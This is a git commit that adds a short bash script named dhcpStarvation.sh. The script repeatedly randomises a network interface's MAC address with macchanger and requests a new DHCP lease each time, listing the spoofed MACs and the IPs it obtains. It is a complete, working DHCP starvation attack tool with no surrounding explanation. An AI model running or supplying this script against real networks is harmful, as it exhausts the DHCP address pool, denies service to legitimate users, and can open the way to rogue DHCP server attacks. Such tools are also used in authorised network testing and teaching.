64f339afb1561e631feaf7cd42505b3a1796d4b6
Mesut TÜRK <mesut-turk@users.noreply.github.com>
2019-08-15 15:22:24 +0300

    Create dhcpStarvation.sh

---
+++ scripts/dhcpStarvation.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+
+if [ -z "$2" ]
+  then
+    echo "Usage: ./dhcpStarvation eth0 10"
+    exit 1
+fi
+
+echo "No	MAC Address		IP Address"
+echo "...	.................	........................"
+for ((i=0;i<$2;i++))
+do
+mac=$(macchanger -r $1|grep New|cut -d" " -f 9)
+dhclient $1
+ip=$(ifconfig $1 | grep inet | grep -v inet6|cut -d" " -f10)
+echo $i" 	"$mac"	"$ip
+done
